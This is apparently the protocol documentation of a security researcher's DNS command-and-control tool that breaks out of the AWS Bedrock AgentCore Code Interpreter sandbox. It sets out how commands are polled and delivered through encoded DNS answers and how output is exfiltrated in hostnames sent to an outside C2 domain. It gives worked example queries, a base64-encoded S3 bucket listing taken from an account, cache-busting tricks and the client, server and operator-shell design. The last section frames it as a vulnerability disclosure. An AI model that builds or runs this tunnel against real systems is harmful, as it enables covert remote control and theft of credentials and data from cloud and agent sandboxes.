# DNS C2 Protocol Documentation

This document explains the DNS-based command and control protocol used to communicate with the payload running in the AWS Bedrock AgentCore Code Interpreter sandbox.

## Overview

The protocol uses DNS A record queries to:
1. **Poll for commands** - Client asks "do you have a command for me?"
2. **Deliver commands** - Server encodes commands in IP addresses
3. **Exfiltrate data** - Client encodes output in DNS query hostnames

All communication happens through DNS queries, bypassing the sandbox's network restrictions.

---

## 1. Command Polling

The client polls the C2 server to check if a command is available.

### Query Format:
```
cmd.<cmd_seq>.<session_id>.<domain>
 ↑   ↑         ↑            ↑
 │   │         │            └─ C2 domain (e.g., c2.bt-research-control.com)
 │   │         └─ Unique session ID (e.g., sess_abc123)
 │   └─ Command sequence number (0, 1, 2, ...) - makes each poll unique
 └─ Command poll identifier
```

### Example Queries:
```
First poll:   cmd.0.sess_abc123.c2.bt-research-control.com
Second poll:  cmd.1.sess_abc123.c2.bt-research-control.com
Third poll:   cmd.2.sess_abc123.c2.bt-research-control.com
```

### Response (IP Address):
- **`127.0.0.1`** = IDLE (no command available)
- **`10.0.0.1`** = Command ready (fetch chunks)
- **`192.168.0.1`** = Session terminated (exit)

### Example:
```
Query:    cmd.0.sess_abc123.c2.bt-research-control.com
Response: 10.0.0.1
          ↑
          └─ Command available! Start fetching chunks.
```

---

## 2. Command Delivery

When a command is available, the client fetches it in chunks. Each chunk is encoded in an IP address.

### Query Format:
```
c<chunk_num>.<session_id>.<domain>
 ↑           ↑            ↑
 │           │            └─ C2 domain
 │           └─ Session ID
 └─ Chunk number (0, 1, 2, ...)
```

### IP Address Encoding:
Each IP address encodes 3 characters of base64 data:

```
IP: 10.100.50.104
    ↑  ↑   ↑  ↑
    │  │   │  └─ ASCII value of 3rd char (104 = 'h')
    │  │   └─ ASCII value of 2nd char (50 = '2')
    │  └─ ASCII value of 1st char (100 = 'd')
    └─ First octet: 10 = more chunks, 11 = last chunk
```

### Example: Command "whoami"

**Step 1: Encode command to base64**
```
"whoami" → base64 → "d2hvYW1p"
```

**Step 2: Split into 3-character chunks**
```
Chunk 0: "d2h"
Chunk 1: "oYW"
Chunk 2: "1p"  (last chunk)
Chunk 3: "i"   (last chunk, padded)
```

**Step 3: Encode each chunk as IP**
```
Query: c0.sess_abc123.c2.bt-research-control.com
Response: 10.100.50.104
          ↑  ↑   ↑  ↑
          │  │   │  └─ 104 = 'h'
          │  │   └─ 50 = '2'
          │  └─ 100 = 'd'
          └─ 10 = more chunks coming

Query: c1.sess_abc123.c2.bt-research-control.com
Response: 10.111.89.87
          ↑  ↑   ↑  ↑
          │  │   │  └─ 87 = 'W'
          │  │   └─ 89 = 'Y'
          │  └─ 111 = 'o'
          └─ 10 = more chunks coming

Query: c2.sess_abc123.c2.bt-research-control.com
Response: 10.49.112.0
          ↑  ↑  ↑   ↑
          │  │  │   └─ 0 = padding
          │  │  └─ 112 = 'p'
          │  └─ 49 = '1'
          └─ 10 = more chunks coming

Query: c3.sess_abc123.c2.bt-research-control.com
Response: 11.105.0.0
          ↑  ↑   ↑ ↑
          │  │   │ └─ 0 = padding
          │  │   └─ 0 = padding
          │  └─ 105 = 'i'
          └─ 11 = LAST CHUNK
```

**Step 4: Client reassembles**
```
"d2h" + "oYW" + "1p" + "i" = "d2hvYW1p"
base64 decode → "whoami"
```

---

## 3. Data Exfiltration

After executing a command, the client exfiltrates the output by encoding it in DNS query hostnames.

### Query Format:
```
<cmd_seq>.<chunk_num>.<total_chunks>.<timestamp>.<base64_data>.<cmd_seq>.<session_id>.<domain>
 ↑         ↑           ↑              ↑            ↑             ↑         ↑           ↑
 │         │           │              │            │             │         │           └─ C2 domain
 │         │           │              │            │             │         └─ Session ID
 │         │           │              │            │             └─ cmd_seq (repeated for cache busting)
 │         │           │              │            └─ Base64-encoded output chunk (DNS-safe: = → -)
 │         │           │              └─ Timestamp (milliseconds, for cache busting)
 │         │           └─ Total number of chunks
 │         └─ Current chunk number (1, 2, 3, ...)
 └─ Command sequence number (increments with each command)
```

### DNS-Safe Base64 Encoding:
Standard base64 uses `+`, `/`, and `=` which aren't DNS-safe. We replace:
- `=` → `-` (equals to dash)

### Example: Exfiltrating "genesis1ptools"

**Step 1: Encode output to base64**
```
"genesis1ptools" → base64 → "Z2VuZXNpczFwdG9vbHM="
```

**Step 2: Make DNS-safe**
```
"Z2VuZXNpczFwdG9vbHM=" → "Z2VuZXNpczFwdG9vbHM-"
                         ↑
                         └─ = replaced with -
```

**Step 3: Split into chunks (60 chars max per DNS label)**
```
Chunk 1: "Z2VuZXNpczFwdG9vbHM-"  (21 chars, fits in one chunk)
```

**Step 4: Send DNS query**
```
Query: 1.1.1.1234.Z2VuZXNpczFwdG9vbHM-.1.sess_abc123.c2.bt-research-control.com
       ↑ ↑ ↑ ↑    ↑                    ↑ ↑            ↑
       │ │ │ │    │                    │ └─ Session ID
       │ │ │ │    │                    └─ cmd_seq (1) - repeated for cache busting
       │ │ │ │    └─ Base64 data (DNS-safe)
       │ │ │ └─ Timestamp (1234 ms)
       │ │ └─ Total chunks (1)
       │ └─ Chunk number (1)
       └─ Command sequence (1)

Response: (doesn't matter, we just need DNS query to reach server)
```

**Step 5: Server extracts data**
```
Parse hostname → Extract "Z2VuZXNpczFwdG9vbHM-"
DNS-safe decode → "Z2VuZXNpczFwdG9vbHM="
Base64 decode → "genesis1ptools"
```

---

## 4. Multi-Chunk Exfiltration

For larger outputs, data is split into multiple chunks.

### Example: Exfiltrating 987 bytes (aws s3 ls output)

**Step 1: Encode and split**
```
Output: "2025-08-21 20:20:54 agent-goat-445570921298\n2025-08-20 19:12:46 agent-goat-demo-bucket..."
Base64: "MjAyNS0wOC0yMSAyMDoyMDo1NCBhZ2VudC1nb2F0LTQ0NTU3MDkyMTI5OAoyMDI1LTA4LTIwIDE5OjEyOjQ2IGFnZW50LWdvYXQtZGVtby1idWNrZXQtMTc1NTcxNzE2NAoyMDI1LTEwLTE5IDEyOjIzOjUwIGFnZW50Y29yZS1oYWNraW5nCjIwMjUtMTAtMTkgMTQ6MzY6NTkgYWdlbnRjb3JlLWhhY2tpbmctc2Vuc2l0aXZlLWRhdGEKMjAyNS0wOC0yNiAxNzoxMjozNSBhZ2VudGdvYXQtY2xvdWR0cmFpbC00NDU1NzA5MjEyOTgKMjAyNS0wOC0yNCAyMjowNTo0MSBhZ2VudGdvYXQtb3BlbmFwaS00NDU1NzA5MjEyOTgKMjAyNS0wOC0yNCAxOToyMDo0MCBhZ2VudGdvYXQtb3BlbmFwaS1zY2hlbWFzCjIwMjUtMDgtMjYgMTc6MTg6MDYgYXRoZW5hLXJlc3VsdHMtNDQ1NTcwOTIxMjk4CjIwMjUtMDgtMjAgMTk6Mzc6NDUgYXdzLXNhbS1jbGktbWFuYWdlZC1kZWZhdWx0LXNhbWNsaXNvdXJjZWJ1Y2tldC1pbmJ1czFtY3M2dzYKMjAyNS0wOS0wMSAxODoxMDoyMiBiZWRyb2NrLWFnZW50Y29yZS1jb2RlYnVpbGQtc291cmNlcy00NDU1NzA5MjEyOTgtdXMtZWFzdC0xCjIwMjUtMDktMDEgMTc6MzQ6MjAgYmVkcm9jay1jdXN0b20tbW9kZWxzLWRlbW8tNDQ1NTcwOTIxMjk4CjIwMjUtMDktMTAgMTY6NTY6MDkgYmVkcm9jay1kb2NzLWtiLWFnZW50cy11cy1lYXN0LTEtNDQ1NTcwOTIxMjk4CjIwMjUtMDktMTEgMTY6MTg6NDkgYmV5b25kdHJ1c3QtamFyZ29uLTQ0NTU3MDkyMTI5OAoyMDI1LTA4LTE3IDE3OjU5OjI1IGtpbm5haXJkLWF3cy1zYW5kYm94LWJlZHJvY2stYWdlbnQtaW5mcmEKMjAyNS0wNy0zMCAxNTo0MDoxNSBraW5uYWlyZC1hd3Mtc2FuZGJveC1zYW0tYXJ0aWZhY3RzLXNhbmRib3gKMjAyNS0wNy0zMCAxNjoyMzowMCBraW5uYWlyZC1hd3Mtc2FuZGJveC1zYW0tYXJ0aWZhY3RzLXNhbmRib3gtdXMtZWFzdC0xCjIwMjUtMDctMjEgMTQ6NDU6MzYgdGVycmFmb3JtLXN0YXRlLWZpbGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg="

Split into 60-char chunks:
Chunk 1:  "MjAyNS0wOC0yMSAyMDoyMDo1NCBhZ2VudC1nb2F0LTQ0NTU3MDkyMTI5"
Chunk 2:  "OAoyMDI1LTA4LTIwIDE5OjEyOjQ2IGFnZW50LWdvYXQtZGVtby1idWN"
Chunk 3:  "rZXQtMTc1NTcxNzE2NAoyMDI1LTEwLTE5IDEyOjIzOjUwIGFnZW50Y29"
...
Chunk 22: "dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-"
```

**Step 2: Send 22 DNS queries**
```
Query 1:  1.1.22.1234.MjAyNS0wOC0yMSAyMDoyMDo1NCBhZ2VudC1nb2F0LTQ0NTU3MDkyMTI5.1.sess_abc123.c2.bt-research-control.com
          ↑ ↑ ↑  ↑
          1 1 22 timestamp

Query 2:  1.2.22.1235.OAoyMDI1LTA4LTIwIDE5OjEyOjQ2IGFnZW50LWdvYXQtZGVtby1idWN.1.sess_abc123.c2.bt-research-control.com
          ↑ ↑ ↑  ↑
          1 2 22 timestamp

...

Query 22: 1.22.22.1256.dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-.1.sess_abc123.c2.bt-research-control.com
          ↑ ↑  ↑  ↑
          1 22 22 timestamp (last chunk)
```

**Step 3: Server reassembles**
```
Collect all 22 chunks → Concatenate base64 → Decode → Original output
```

---

## 5. Cache Busting Strategy

### Problem: DNS Caching
When the same command produces identical output twice, DNS resolvers may cache the queries and not send them to our server.

### Solution: Multiple Cache-Busting Techniques

1. **Command sequence number** (`cmd_seq`)
   - Increments with each command (0, 1, 2, ...)
   - Appears at the start of the query
   - Also repeated between base64 data and session ID

2. **Timestamp** (`timestamp_ms`)
   - Current time in milliseconds (last 4 digits)
   - Changes every millisecond
   - Ensures each retry is unique

3. **Strategic placement**
   ```
   <cmd_seq>.<chunk>.<total>.<timestamp>.<data>.<cmd_seq>.<session>.<domain>
                                                  ↑
                                                  └─ cmd_seq repeated here to break cache
   ```

### Example: Same Command, Different Exfiltration Queries

**First execution (cmd_seq=1):**
```
1.1.2.1234.Q291bGQgbm90IGNvbm5lY3Q.1.sess_abc123.c2.bt-research-control.com
↑       ↑                         ↑
└─ 1    └─ timestamp 1234         └─ cmd_seq=1 (repeated)
```

**Second execution (cmd_seq=2):**
```
2.1.2.5678.Q291bGQgbm90IGNvbm5lY3Q.2.sess_abc123.c2.bt-research-control.com
↑       ↑                         ↑
└─ 2    └─ timestamp 5678         └─ cmd_seq=2 (repeated)
```

Even though the base64 data is identical, the cmd_seq changes make the queries unique!

---

## 6. Protocol Flow Diagram

```
┌─────────────┐                                    ┌─────────────┐
│   Operator  │                                    │   Client    │
│    Shell    │                                    │  (Sandbox)  │
└──────┬──────┘                                    └──────┬──────┘
       │                                                  │
       │ 1. Queue command via HTTP API                   │
       ├─────────────────────────────────────────────────►
       │         POST /api/command                        │
       │         {"session": "sess_abc", "cmd": "whoami"}│
       │                                                  │
       │                                                  │ 2. Poll for command
       │                                                  ├──────────┐
       │                                                  │          │ DNS Query:
       │                                                  │          │ cmd.0.sess_abc.c2.domain
       │                                                  │          │
       │                                                  │◄─────────┘ Response: 10.0.0.1
       │                                                  │            (command ready)
       │                                                  │
       │                                                  │ 3. Fetch command chunks
       │                                                  ├──────────┐
       │                                                  │          │ c0.sess_abc.c2.domain
       │                                                  │◄─────────┘ → 10.100.50.104
       │                                                  │          │ c1.sess_abc.c2.domain
       │                                                  │◄─────────┘ → 10.111.89.87
       │                                                  │          │ c2.sess_abc.c2.domain
       │                                                  │◄─────────┘ → 11.105.0.0
       │                                                  │
       │                                                  │ 4. Execute command
       │                                                  ├──────────┐
       │                                                  │ whoami   │
       │                                                  │◄─────────┘
       │                                                  │ Output: "genesis1ptools"
       │                                                  │
       │                                                  │ 5. Exfiltrate output
       │                                                  ├──────────┐
       │                                                  │          │ DNS Query:
       │                                                  │          │ 1.1.1.1234.Z2VuZXNpczFwdG9vbHM-.1.sess_abc.c2.domain
       │                                                  │          │
       │ 6. Retrieve output via HTTP API                 │          │
       │◄─────────────────────────────────────────────────          │
       │         GET /api/output?session=sess_abc        │          │
       │         Response: {"output": "genesis1ptools"}  │          │
       │                                                  │          │
       │ 7. Display to operator                          │          │
       ├──────────┐                                      │          │
       │ Output:  │                                      │          │
       │ genesis1ptools                                  │          │
       │◄─────────┘                                      │          │
       │                                                  │          │
```

---

## 7. Implementation Notes

### Client (payload_client.py)
- Polls every 3 seconds by default
- Retries DNS queries 3 times on failure
- Uses `getent hosts` for DNS queries (curl available with `--use-curl` flag)
- Logs all activity to `c2_client.log`

### Server (dns_server_with_api.py)
- Listens on UDP port 53 for DNS queries
- Listens on TCP port 8080 for HTTP API
- Logs to CloudWatch (`/aws/ec2/dns-c2-server`)
- Tracks sessions and manages command queues

### Operator Shell (attacker_shell.py)
- Interactive shell for sending commands
- Communicates with server via HTTP API
- Streams client logs in real-time
- Handles session lifecycle (start/stop/cleanup)

---

## 8. Limitations

### Known Issues
1. **Identical outputs**: Running the same command twice with identical output may fail due to aggressive DNS caching at AWS infrastructure level
2. **Session timeout**: Code Interpreter sessions expire after 15 minutes
3. **Chunk size**: Limited to 60 characters per DNS label (DNS spec: 63 chars max)
4. **Latency**: ~3-6 seconds per command due to polling interval

### Workarounds
- **Identical outputs**: Use `--use-curl` flag or avoid running same failing command twice
- **Session timeout**: Exit and restart operator shell to create new session
- **Large outputs**: Automatically split into multiple chunks (tested up to 987 bytes)

---

## 9. Security Implications

This protocol demonstrates that AWS Bedrock AgentCore Code Interpreter's "sandbox" network mode does NOT properly isolate from DNS, allowing:

1. **Bidirectional communication** via DNS queries and responses
2. **Command execution** with full IAM role permissions
3. **Data exfiltration** of arbitrary data (files, credentials, etc.)
4. **Interactive reverse shell** via DNS tunneling

The vulnerability exists because:
- DNS queries are allowed to egress from the sandbox
- No rate limiting on DNS queries
- No monitoring of DNS-based C2 activity
- Overly permissive IAM roles assigned to Code Interpreter

---

## 10. References

- [CLAUDE.md](../CLAUDE.md) - Project overview and architecture
- [TESTING.md](TESTING.md) - Testing guide
- [payload_client.py](../attacker-infra/src/payload_client.py) - Client implementation
- [dns_server_with_api.py](../attacker-infra/terraform/c2-server/dns_server_with_api.py) - Server implementation

